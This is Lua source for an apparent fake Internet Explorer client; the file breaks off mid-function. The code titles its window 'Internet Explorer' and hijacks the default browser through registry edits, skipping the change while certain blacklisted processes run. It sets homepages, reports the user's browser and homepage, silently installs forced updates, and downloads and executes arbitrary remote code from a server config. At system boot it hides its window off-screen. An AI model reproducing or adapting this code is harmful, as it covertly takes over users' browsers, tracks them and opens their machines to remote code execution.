local tipUtil = XLGetObject("API.Util")
local tipAsynUtil = XLGetObject("API.AsynUtil")
local FunctionObj = nil

local gnLastReportRunTmUTC = 0
local bHideFakeIE = false
XLSetGlobal("bHideFakeIE", bHideFakeIE)
-----------------

function RegisterFunctionObject()
	local strFunhelpPath = __document.."\\..\\functionhelper.lua"
	XLLoadModule(strFunhelpPath)
	
	local tFunH = XLGetGlobal("YBYL.FunctionHelper")
	if type(tFunH) ~= "table" then
		return false
	else
		return true
	end

end


function LoadIEHelper()
	local strIEHelperPath = __document.."\\..\\IEMenuHelper.lua"
	XLLoadModule(strIEHelperPath)
end


function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end


function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end

function ShowMainTipWnd(objMainWnd)
	if not bHideFakeIE then
		objMainWnd:Show(5)
		FunctionObj.RestoreWndSize()
		SendStartupReport(true)
		-- objMainWnd:SetAppWindow(1)
	else
		-- 将窗口区域移到屏幕外面,防止机器卡机时屏幕出现虚框
		
		local screenWidth, screenHeight = tipUtil:GetScreenSize()
		objMainWnd:Move(screenWidth + 100, screenHeight + 100, 100, 100)
		
		objMainWnd:Show(0)
		FunctionObj.ShowHeadWindow()
	end
	
	objMainWnd:SetTitle("Internet Explorer")
end


function SendStartupReport(bShowWnd)
	local tStatInfo = {}
	
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	tStatInfo.strEL = strSource or ""
	
	if not bShowWnd then
		tStatInfo.strEC = "launch"  --进入上报
		if bHideFakeIE then
			tStatInfo.strEC = "launch_hide"
		end
		tStatInfo.strEA = FunctionObj.GetInstallSrc() or ""
		tStatInfo.strEL = strSource or ""
	else
		tStatInfo.strEC = "showui" 	 --展示上报
		tStatInfo.strEA = strSource or ""
		tStatInfo.strEL = FunctionObj.GetMinorVerFormat() or ""
	end
		
	tStatInfo.strEV = 1
	
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		item:KillTimer(id)
		FunctionObj.TipConvStatistic(tStatInfo)
	end, 1000)
end


function SendUserInfoReport()
	local bHasSend = CheckHasSendUserInfo()
	if bHasSend then
		return
	end
	
	local tStatBrow = {}
	
	local strSource = FunctionObj.GetInstallSrc()
	
	tStatBrow.strEL = strSource or ""
	tStatBrow.strEV = 1
	tStatBrow.strEC = "defaultbrowser"  --默认浏览器
	tStatBrow.strEA = FunctionObj.GetDefaultBrowser() or ""
	FunctionObj.DelayTipConvStatistic(tStatBrow)
	
	local tStatHP = {}
	tStatHP.strEL = strSource or ""
	tStatHP.strEV = 1
	tStatHP.strEC = "iehomepage"  --首页
	tStatHP.strEA = FunctionObj.GetHomePageFromReg() or ""
	FunctionObj.DelayTipConvStatistic(tStatHP)
	
	SaveLastReportBrowser()
end


function CheckHasSendUserInfo()
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	local nLastReportBrowser = tUserConfig["nLastReportBrowser"] or 0
	
	if FunctionObj.CheckTimeIsAnotherDay(nLastReportBrowser) then
		return false
	else
		return true
	end
end


function SaveLastReportBrowser()
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	tUserConfig["nLastReportBrowser"] = tipUtil:GetCurrentUTCTime()
	
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function CheckForceVersion(tForceVersion)
	if type(tForceVersion) ~= "table" then
		return false
	end

	local bRightVer = false
	
	local strCurVersion = FunctionObj.GetExeVersion()
	local _, _, _, _, _, strCurVersion_4 = string.find(strCurVersion, "(%d+)%.(%d+)%.(%d+)%.(%d+)")
	local nCurVersion_4 = tonumber(strCurVersion_4)
	if type(nCurVersion_4) ~= "number" then
		return bRightVer
	end
	for iIndex = 1, #tForceVersion do
		local strRange = tForceVersion[iIndex]
		local iPos = string.find(strRange, "-")
		if iPos ~= nil then
			local lVer = tonumber(string.sub(strRange, 1, iPos - 1))
			local hVer = tonumber(string.sub(strRange, iPos + 1))
			if lVer ~= nil and hVer ~= nil and nCurVersion_4 >= lVer and nCurVersion_4 <= hVer then
				bRightVer = true
				break
			end
		else
			local verFlag = tonumber(strRange)
			if verFlag ~= nil and nCurVersion_4 == verFlag then
				bRightVer = true
				break
			end
		end
	end
	
	return bRightVer
end


function TryForceUpdate(tServerConfig)
	if FunctionObj.CheckIsUpdating() then
		FunctionObj.TipLog("[TryForceUpdate] CheckIsUpdating failed,another thread is updating!")
		return
	end

	local bPassCheck = FunctionObj.CheckCommonUpdateTime(1)
	if not bPassCheck then
		FunctionObj.TipLog("[TryForceUpdate] CheckCommonUpdateTime failed")
		return		
	end

	local tNewVersionInfo = tServerConfig["tNewVersionInfo"] or {}
	local tForceUpdate = tNewVersionInfo["tForceUpdate"]
	if(type(tForceUpdate)) ~= "table" then
		return 
	end
	
	local strCurVersion = FunctionObj.GetExeVersion()
	local strNewVersion = tForceUpdate.strVersion		
	if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
		or not FunctionObj.CheckIsNewVersion(strNewVersion, strCurVersion) then
		return
	end
	
	local tVersionLimit = tForceUpdate["tVersion"]
	local bPassCheck = CheckForceVersion(tVersionLimit)
	FunctionObj.TipLog("[TryForceUpdate] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
	if not bPassCheck then
		return 
	end
	
	FunctionObj.SetIsUpdating(true)
	
	FunctionObj.DownLoadNewVersion(tForceUpdate, function(strRealPath) 
		FunctionObj.SetIsUpdating(false)
	
		if not IsRealString(strRealPath) then
			return
		end
		
		FunctionObj.SaveCommonUpdateUTC()
		local strCmd = " /write /silent /run"
		tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
	end)
end


function TryExecuteExtraCode(tServerConfig)
	local tExtraHelper = tServerConfig["tExtraHelper"] or {}
	local strURL = tExtraHelper["strURL"]
	local strMD5 = tExtraHelper["strMD5"]
	
	if not IsRealString(strURL) then
		return
	end
	local strHelperName = FunctionObj.GetFileSaveNameFromUrl(strURL)
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, strHelperName)
	
	FunctionObj.DownLoadFileWithCheck(strURL, strSavePath, strMD5
	, function(bRet, strRealPath)
		FunctionObj.TipLog("[TryExecuteExtraCode] strURL:"..tostring(strURL)
		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
				
		if bRet < 0 then
			return
		end
		
		FunctionObj.TipLog("[TryExecuteExtraCode] begin execute extra helper")
		XLLoadModule(strRealPath)
	end)	
end


--改userconfig中的首页字段
function TrySetConfigHomePage(tServerConfig)
	FunctionObj.TipLog("[TrySetConfigHomePage] begin ")
	
	if type(tServerConfig) ~= "table" or type(tServerConfig["tURLMap"]) ~= "table" then
		FunctionObj.TipLog("[TrySetConfigHomePage] tURLMap not a table ")
		return false
	end
	
	local tURLMap = tServerConfig["tURLMap"]
	local strInstallSrc = FunctionObj.GetInstallSrc()
	
	for strSource, strURL in pairs(tURLMap) do
		if string.lower(strSource) == string.lower(strInstallSrc) 
			and IsRealString(strURL) then
			FunctionObj.SetHomePage(strURL)
			FunctionObj.TipLog("[TrySetConfigHomePage] seturl: "..tostring(strURL))
			return true
		end
	end
	
	return false
end


function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig")
	--FunctionObj.TipLog("[TrySetDefaultBrowser] enter")
	
	--DoSetDefaultBrowser()
	
	local tDefaultBrowser = tServerConfig["tDefaultBrowser"]
	if type(tDefaultBrowser) ~= "table" or type(tUserConfig) ~= "table" then
		FunctionObj.TipLog("[TrySetDefaultBrowser] get table info failed")
		return false
	end

	if not bIgnoreSpanTime then
		local nSpanTimeInSec = tDefaultBrowser["nSpanTimeInSec"] or 24*3600
		local nLastSetDefaultUTC = tUserConfig["nLastSetDefaultUTC"] or 0
		local bPassCheck = CheckSpanTime(nLastSetDefaultUTC, nSpanTimeInSec)
		if not bPassCheck then
			FunctionObj.TipLog("[TrySetDefaultBrowser] CheckSpanTime failed")
			return false
		end
	end

	local strBlackList = tDefaultBrowser["strBlackList"] or ""
	local bPassCheck = CheckProcessList(strBlackList)
	if not bPassCheck then
		FunctionObj.TipLog("[TrySetDefaultBrowser] CheckProcessList failed")
		return false
	end

	local strBrowserList = tDefaultBrowser["strBrowserList"] or ""
	local bPassCheck = CheckBrowserList(strBrowserList)
	if not bPassCheck then
		FunctionObj.TipLog("[TrySetDefaultBrowser] strBrowserList failed")
		return false
	end
	
	local bSuccess = DoSetDefaultBrowser()
	if not bSuccess then
		FunctionObj.TipLog("[TrySetDefaultBrowser] DoSetDefaultBrowser failed")
		return false
	end	
		
	tUserConfig["nLastSetDefaultUTC"] = tipUtil:GetCurrentUTCTime()
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
	return true
end


function SendSetDefBrowReport(bExit, strSource)
	local tStatInfo = {}

	tStatInfo.strEC = "setdefaultbrowser"  --进入上报
	tStatInfo.strEA = strSource or "local"
	tStatInfo.strEL = FunctionObj.GetInstallSrc() or ""
	tStatInfo.strEV = 1
	
	if bExit then
		tStatInfo.Exit = true
	end
	FunctionObj.TipConvStatistic(tStatInfo)
end


function CheckSpanTime(nLastRecordTime, nSpanTimeInSec)
	if tonumber(nLastRecordTime) == nil or tonumber(nLastRecordTime) == 0 
		or tonumber(nSpanTimeInSec) == nil or tonumber(nSpanTimeInSec) == 0 then
		return true
	end

	local nCurrentTime = tipUtil:GetCurrentUTCTime()
	if math.abs(nCurrentTime-nLastRecordTime) > nSpanTimeInSec then
		return true
	else
		return false
	end
end


function CheckProcessList(strProcessList)
	local tProcessList = FunctionObj.SplitStringBySeperator(strProcessList, ";") or {}
	
	for _, strProcessName in pairs(tProcessList) do
		local strExeName = strProcessName..".exe"
		local bExists = tipUtil:QueryProcessExists(strExeName)
		if bExists then
			FunctionObj.TipLog("[CheckProcessList] find process: "..tostring(strExeName))
			return false
		end
	end
	
	return true
end


function CheckBrowserList(strProcessList)
	local tProcessList = FunctionObj.SplitStringBySeperator(strProcessList, ";") or {}
	local strCruDefault = FunctionObj.GetDefaultBrowser()
	
	for _, strProcessName in pairs(tProcessList) do
		if string.find(strCruDefault, string.lower(strProcessName)) then
			FunctionObj.TipLog("[CheckBrowserList] find process: "..tostring(strProcessName))
			return true
		end
	end
	
	return false
end


function RedirectSysIEPath()
	local strFakeIEPath = FunctionObj.GetExePath()
	local strIERegPath = "HKEY_CLASSES_ROOT\\Applications\\iexplore.exe\\shell\\open\\command\\"
	local strOldIEPath = FunctionObj.RegQueryValue(strIERegPath)
	if IsRealString(strOldIEPath) and string.find(strOldIEPath, strFakeIEPath) then
		FunctionObj.TipLog("[RedirectSysIEPath] has set default browser -- Applications")
		return
	end
	
	local strCommand = "\""..strFakeIEPath.."\"  \"%1\""
	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRAppIE", strOldIEPath)
	FunctionObj.RegSetValue(strIERegPath, strCommand, true)
end

function IsWin7()
	local sysVersion = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentVersion")
	
	if tonumber(sysVersion) and tonumber(sysVersion) > 6.0 and tonumber(sysVersion) < 6.2 then	
		return true
	end
	return false
end

-- 准备progid
function PrepareProgID(strProgID)
	local bInfMode = true
	local bIs64 = FunctionObj.CheckIs64OS()
	FunctionObj.TipLog("PrepareProgID(strProgID)")
	
	local strBrowserPath = FunctionObj.GetExePath()
	local strBrowPathWithFix = "\""..strBrowserPath.."\""
	local strCommand = strBrowPathWithFix.." \"%1\""
		
	if not FunctionObj.IsUserAdmin() then
		strBrowPathWithFix = "\"\"\""..strBrowserPath.."\"\"\""
		strCommand = strBrowPathWithFix.." \"\"\"%1\"\"\""
	end
	
	local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
	if not IsRealString(strRegValue) then
		tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\shell\\open\\command")
		FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\", strCommand, bIs64, bInfMode)
	end

	local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
	if not IsRealString(strRegValue) then
		tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\Application")
		FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon", strBrowPathWithFix, bIs64, bInfMode)
	end

	
	-- 设置默认图标
	local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\")
	if not IsRealString(strRegValue) then
		local strRegIconPath = "HKEY_CLASSES_ROOT\\IE.HTTP\\DefaultIcon\\"
		local strIcoPath = FunctionObj.RegQueryValue(strRegIconPath)

		if IsRealString(strIcoPath) then
			tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\DefaultIcon")
			FunctionObj.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\", strIcoPath, bIs64, bInfMode) 
		end
	end
	
	if IsWin7() then
		local userChoiceReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
		local userChoice = FunctionObj.RegQueryValue(userChoiceReg)
		if userChoice then
			FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRProgid", userChoice, "REG_SZ")
		end
		FunctionObj.DelRegValueInUAC("HKEY_CURRENT_USER", "Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", "Progid")
	end
	
	FunctionObj.DelRegValueInUAC("HKEY_CLASSES_ROOT", "http\\shell", "")
	
	local bIs64 = FunctionObj.CheckIs64OS()
	FunctionObj.CommitRegOperation(bIs64)
	
	-- local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
	-- if not IsRealString(strRegValue) then
		-- return false --写失败
	-- end
	
	-- local strRegValue = FunctionObj.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
	-- if not IsRealString(strRegValue) then
		-- return false --写失败
	-- end
	
	return true
end


function SetFakeIERegInUAC(strCommand)
	local strProgID = "IEHTML"
	FunctionObj.TipLog("SetFakeIERegInUAC(strProgID)")
	
	local bSuccess = PrepareProgID(strProgID)
	if not bSuccess then
		FunctionObj.TipLog("[SetFakeIERegInUAC] PrepareProgID failed ")
		return false
	end
	
	local bIs64 = FunctionObj.CheckIs64OS()
	local bRefresh = false
	--设置默认浏览器
	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
	local strRegValue = FunctionObj.RegQueryValue(strRegPath)
	if strRegValue ~= strProgID then
		FunctionObj.RegSetValue(strRegPath, strProgID, bIs64)
		FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPProgid", strRegValue, bIs64)
		bRefresh = true
	end
	
	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\https\\UserChoice\\Progid"
	local strRegValue = FunctionObj.RegQueryValue(strRegPath)
	if strRegValue ~= strProgID then
		FunctionObj.RegSetValue(strRegPath, strProgID, bIs64)
		FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPSProgid", strRegValue, bIs64)
		bRefresh = true
	end
	
	if bRefresh then
		tipUtil:RefleshIcon(nil)
	end
	
	return true
end


function DoSetDefaultBrowser()
	FunctionObj.TipLog("[DoSetDefaultBrowser] begin")
	
	local strBrowserPath = FunctionObj.GetExePath()
	if not IsRealString(strBrowserPath) or not tipUtil:QueryFileExists(strBrowserPath) then
		return false
	end
	
	-- RedirectSysIEPath()
	
	local bSuccess = SetFakeIERegInUAC()
	if not bSuccess then
		return false
	end

	return true
end


function FixUserConfig(tServerConfig)
	local tUserConfigInServer = tServerConfig["tUserConfigInServer"]
	if type(tUserConfigInServer) ~= "table" then
		return
	end

	local tLocalUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	tLocalUserConfig["nMaxUrlHistroy"] = tUserConfigInServer["nMaxUrlHistroy"] or 100
	tLocalUserConfig["nMaxUserCollect"] = tUserConfigInServer["nMaxUserCollect"] or 100
		
	if IsRealString(tUserConfigInServer["strOpenTabURL"]) then
		tLocalUserConfig["strOpenTabURL"] = tUserConfigInServer["strOpenTabURL"]
	end
	
	if type(tUserConfigInServer["tOpenStupURL"]) == "table" and #tUserConfigInServer["tOpenStupURL"] >1 then
		tLocalUserConfig["tOpenStupURL"] = tUserConfigInServer["tOpenStupURL"]
	end
	
	--下一次的自杀延时配置
	if type(tUserConfigInServer["nKillSelfDelay"]) == "number" and tUserConfigInServer["nKillSelfDelay"] > 1000 then
		tLocalUserConfig["nKillSelfDelay"] = tUserConfigInServer["nKillSelfDelay"]
	end
	FunctionObj.TipLog(" strHomePage and nKillSelfDelay: "..tostring(tLocalUserConfig["strHomePage"]).." , "..tostring(tLocalUserConfig["nKillSelfDelay"]))
	--提示去广告的间隔时间
	if type(tUserConfigInServer["nAdvCountIncInterval"]) == "number" then
		tLocalUserConfig["nAdvCountIncInterval"] = tUserConfigInServer["nAdvCountIncInterval"]
	end
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function AnalyzeServerConfig(nDownServer, strServerPath)
	if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
		FunctionObj.TipLog("[AnalyzeServerConfig] Download server config failed , start tipmain ")
		-- TipMain()
		return	
	end
	
	local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
	TryForceUpdate(tServerConfig)
	FixUserConfig(tServerConfig)
	local bSetSuccess = TrySetDefaultBrowser(tServerConfig)
	if bSetSuccess then
		SendSetDefBrowReport(false)
	end
	--非开机启动更新视频规则
	if not bHideFakeIE then
		CheckServerRuleFile(tServerConfig)
	end
	TryExecuteExtraCode(tServerConfig)
end

function CheckServerRuleFile(tServerConfig)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local tServerData = FetchValueByPath(tServerConfig, {"tServerData"}) or {}
	
	local strServerVideoURL = FetchValueByPath(tServerData, {"tServerVideo", "strURL"})
	local strServerVideoMD5 = FetchValueByPath(tServerData, {"tServerVideo", "strMD5"})
	
	if not IsRealString(strServerVideoURL) or not IsRealString(strServerVideoMD5) then
		FunctionObj.TipLog("[CheckServerRuleFile] get server rule info failed")
		return
	end
	
	local strVideoSavePath = FunctionObj.GetCfgPathWithName("sieres.js")
	if not IsRealString(strVideoSavePath) or not tipUtil:QueryFileExists(strVideoSavePath) then
		strVideoSavePath = FunctionObj.GetCfgPathWithName("ieres.js")
	end
	if IsRealString(strVideoSavePath) and tipUtil:QueryFileExists(strVideoSavePath) then
		local strDataVMD5 = tipUtil:GetMD5Value(strVideoSavePath)
		if tostring(strDataVMD5) == strServerVideoMD5 then
			return
		end
	end

	local strPath = FunctionObj.GetCfgPathWithName("sieres.js")
	FunctionObj.NewAsynGetHttpFile(strServerVideoURL, strPath, false
		, function(bRet, strVideoPath)
			FunctionObj.TipLog("[DownLoadServerRule] bRet:"..tostring(bRet)
					.." strVideoPath:"..tostring(strVideoPath))
			FunctionObj.TipLog("[DownLoadServerRule] download finish")
		end, 5*1000)
end

function StartRunCountTimer()
	FunctionObj.SendRunTimeReport(0, false)
	
	local nTimeSpanInSec = 10 * 60 
	local nTimeSpanInMs = nTimeSpanInSec * 1000
	local timerManager = XLGetObject("Xunlei.UIEngine.TimerManager")
	timerManager:SetTimer(function(item, id)
		gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
		FunctionObj.SendRunTimeReport(nTimeSpanInSec, false)
		XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
	end, nTimeSpanInMs)
end


--弹出窗口--
local g_tPopupWndList = {
	-- [1] = {"TipHeadFullScrnWnd", "TipHeadFullScrnTree"},
}


function CreatePopupTipWnd()
	for key, tItem in pairs(g_tPopupWndList) do
		local strHostWndName = tItem[1]
		local strTreeName = tItem[2]
		local bSucc = CreateWndByName(strHostWndName, strTreeName)
	end
	
	 
	FunctionObj.InitToolTip()
	
	return true
end

function CreateWndByName(strHostWndName, strTreeName)
	local bSuccess = false
	local strInstWndName = strHostWndName..".Instance"
	local strInstTreeName = strTreeName..".Instance"
	
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local frameHostWndTemplate = templateMananger:GetTemplate(strHostWndName, "HostWndTemplate" )
	if frameHostWndTemplate then
		local frameHostWnd = frameHostWndTemplate:CreateInstance(strInstWndName)
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate(strTreeName, "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance(strInstTreeName)
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local iRet = frameHostWnd:Create()
					if iRet ~= nil and iRet ~= 0 then
						bSuccess = true
					end
				end
			end
		end
	end

	return bSuccess
end

function DestroyPopupWnd()
	local hostwndManager = XLGetObject("Xunlei.UIEngine.HostWndManager")

	for key, tItem in pairs(g_tPopupWndList) do
		local strPopupWndName = tItem[1]
		local strPopupInst = strPopupWndName..".Instance"
		
		local objPopupWnd = hostwndManager:GetHostWnd(strPopupInst)
		if objPopupWnd then
			hostwndManager:RemoveHostWnd(strPopupInst)
		end
	end
end


function PopTipWnd(OnCreateFunc)
	local bSuccess = false
	local templateMananger = XLGetObject("Xunlei.UIEngine.TemplateManager")
	local mainWndID = bHideFakeIE and "TipMainWnd.Hide" or "TipMainWnd"
	local frameHostWndTemplate = templateMananger:GetTemplate(mainWndID, "HostWndTemplate" )
	local frameHostWnd = nil
	if frameHostWndTemplate then
		frameHostWnd = frameHostWndTemplate:CreateInstance("YBYLTipWnd.MainFrame")
		if frameHostWnd then
			local objectTreeTemplate = nil
			objectTreeTemplate = templateMananger:GetTemplate("TipPanelTree", "ObjectTreeTemplate")
			if objectTreeTemplate then
				local uiObjectTree = objectTreeTemplate:CreateInstance("YBYLTipWnd.MainObjectTree")
				if uiObjectTree then
					frameHostWnd:BindUIObjectTree(uiObjectTree)
					local ret = OnCreateFunc(uiObjectTree)
					if ret then
						local iRet = frameHostWnd:Create()
						if iRet ~= nil and iRet ~= 0 then
							bSuccess = true
							ShowMainTipWnd(frameHostWnd)
						end
					end
				end
			end
		end
	end
	if not bSuccess then
		
		FunctionObj:FailExitTipWnd(4)
	end
end


function ProcessCommandLine()
	ProcessLocalCommand()      --解析自身的命令行
	
	local bHasOpenLink = ProcessIECommand()    --解析ie的命令行
	if bHasOpenLink then
		return
	end
	
	TryOpenURLWhenStup()
end


function ProcessLocalCommand()
end


--模拟解析ie命令行
function ProcessIECommand()
	local bHasOpenLink = true
	local cmdString = tipUtil:GetCommandLine()
	local cmdList = tipUtil:CommandLineToList(cmdString)
	
	local bRet, strURL = FunctionObj.GetCommandStrValue4IE("-new")
	if bRet and FunctionObj.SimpleCheckIsURL(strURL) then
		FunctionObj.OpenURLInNewTab(strURL)
		return bHasOpenLink
	end
	
	local strURL = cmdList[1]
	if IsRealString(cmdString) and FunctionObj.SimpleCheckIsURL(strURL) then
		FunctionObj.OpenURLInNewTab(strURL)
		return bHasOpenLink
	end
	
	return not bHasOpenLink
end


function TryOpenURLWhenStup()
	FunctionObj.OpenURLWhenStup()
end


function CreateMainTipWnd()
	local function OnCreateFuncF(treectrl)
		local rootctrl = treectrl:GetUIObject("root.layout:root.ctrl")
		local bRet = rootctrl:SetTipData()			
		if not bRet then
			return false
		end
	
		return true
	end
	PopTipWnd(OnCreateFuncF)	
end


function TipMain() 
	CreateMainTipWnd()
	CreatePopupTipWnd()
	ProcessCommandLine()
end


function DoBackupBussiness()
	FunctionObj.TipLog("[DoBackupBussiness] enter")
	
	local bIgnoreSpanTime = false
	local bSetHomePage = false
	local bRet, strSource = FunctionObj.GetCommandStrValue("/setdefault")
	if not bRet then
		FunctionObj.TipLog("[DoBackupBussiness] check /setdefault false")
		return false
	end
	
	FunctionObj.TipLog("[DoBackupBussiness] strSource:"..tostring(strSource))
	
	local fnDownLoadCofig = FunctionObj.DownLoadServerConfig
	if IsRealString(strSource) 
		and (string.lower(strSource) == "ybylpacket" or string.lower(strSource) == "iepacket") then
		fnDownLoadCofig = FunctionObj.DownLoadInstallConfig
		-- bIgnoreSpanTime = true
		bSetHomePage = true
	end
	
	if type(fnDownLoadCofig) ~= "function" then
		FunctionObj.TipLog("[DoBackupBussiness] fnDownLoadCofig not a function")
		return false
	end
	
	fnDownLoadCofig(function (nDownServer, strServerPath)
		if nDownServer ~= 0 or not tipUtil:QueryFileExists(tostring(strServerPath)) then
			FunctionObj.TipLog("[DoBackupBussiness] Download server config failed , quit ")
			tipUtil:Exit("Exit")
			return	
		end
	
		local tServerConfig = FunctionObj.LoadTableFromFile(strServerPath) or {}
		if bSetHomePage then
			TrySetConfigHomePage(tServerConfig)
		end
		
		local bSetSuccess = TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
		if bSetSuccess then
			SendSetDefBrowReport(true, strSource)
		else
			tipUtil:Exit("Exit")
		end
	end)
	
	return true
end


function CreateFilterListener()
	local objFactory = XLGetObject("APIListen.Factory")
	if not objFactory then
		FunctionObj.TipLog("[CreateFilterListener] not support APIListen.Factory")
		return
	end
	
	local objListen = objFactory:CreateInstance()	
	objListen:AttachListener(function(key,...)	
			FunctionObj.TipLog("[CreateFilterListener] key: " .. tostring(key))	
			if tostring(key) == "OnKillSelf" then
				FunctionObj.TipLog("[CreateFilterListener] OnKillSelf, exit soon!")
				tipUtil:Exit("Exit")
			end
		end
	)
end

function RunJsHost()
	local bRet,strAllUserDir = FunctionObj:QueryAllUsersDir()
	if not bRet then
		return false
	end
	
	local strYBHostCfgPath = tipUtil:PathCombine(strAllUserDir,"iefhost\\config.ini")
	
	return tipUtil:RunSH(strYBHostCfgPath)
end

----加载视频规则begin
function GenDecFilePath(strEncFilePath)
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strKey = "7uxSw0inyfnTawtg"
	local strDecString = tipUtil:DecryptFileAES(strEncFilePath, strKey)
	if type(strDecString) ~= "string" then
		FunctionObj.TipLog("[GenDecFilePath] DecryptFileAES failed : "..tostring(strEncFilePath))
		return ""
	end
	
	local strTmpDir = tipUtil:GetSystemTempPath()
	if not tipUtil:QueryFileExists(strTmpDir) then
		FunctionObj.TipLog("[GenDecFilePath] GetSystemTempPath failed strTmpDir: "..tostring(strTmpDir))
		return ""
	end
	
	local strCfgName = tipUtil:GetTmpFileName() or "data.dat"
	local strCfgPath = tipUtil:PathCombine(strTmpDir, strCfgName)
	tipUtil:WriteStringToFile(strCfgPath, strDecString)
	return strCfgPath
end

function GetVideoRulePath()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strServerVideoRulePath = FunctionObj.GetCfgPathWithName("sieres.js")
	if IsRealString(strServerVideoRulePath) and tipUtil:QueryFileExists(strServerVideoRulePath) then
		return strServerVideoRulePath
	end

	local strVideoRulePath = FunctionObj.GetCfgPathWithName("ieres.js")
	if IsRealString(strVideoRulePath) and tipUtil:QueryFileExists(strVideoRulePath) then
		return strVideoRulePath
	end
	
	return ""
end

function SendRuleListtToFilterThread()
	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
	local strVideoRulePath = GetVideoRulePath()
	if not IsRealString(strVideoRulePath) or not tipUtil:QueryFileExists(strVideoRulePath) then
		return false
	end

	local strDecVideoRulePath = GenDecFilePath(strVideoRulePath)
	if not IsRealString(strDecVideoRulePath) then
		return false	
	end
	local bSucc = tipUtil:LoadVideoRules(strDecVideoRulePath)
	if not bSucc then
		FunctionObj.TipLog("[SendRuleListtToFilterThread] LoadVideoRules failed")
		return false
	end
	tipUtil:FYBFilter(true)
	
	tipUtil:DeletePathFile(strDecVideoRulePath)
	
	return true
end
----加载视频规则end

function PreTipMain() 
	gnLastReportRunTmUTC = tipUtil:GetCurrentUTCTime()
	XLSetGlobal("YBYL.LastReportRunTime", gnLastReportRunTmUTC) 
	
	if not RegisterFunctionObject() then
		tipUtil:Exit("Exit")
	end
	
	FunctionObj = XLGetGlobal("YBYL.FunctionHelper")
	FunctionObj.ReadAllConfigInfo()
	
	local bDoBackup = DoBackupBussiness()
	if bDoBackup then
		return
	end
	
	StartRunCountTimer()

	LoadIEHelper()	
		
	SendStartupReport(false)
	SendUserInfoReport()
	
	--是否是开机启动, 是的话隐藏界面
	 
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	if bRet and "sysboot" == strSource then
		--将窗口区域移到屏幕外面
		bHideFakeIE = true
		--监听自杀事件
		tipAsynUtil:AsynPostWndMsg(nil,"{C3CE0473-57F7-4a0a-9CF4-C1ECB8A3C514}_dsmainmsg_ie",1024+401,0,0,function(nRet)
			CreateFilterListener()
			
			--读本地配置，设置超时自杀,默认不自杀
			local tLocalUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
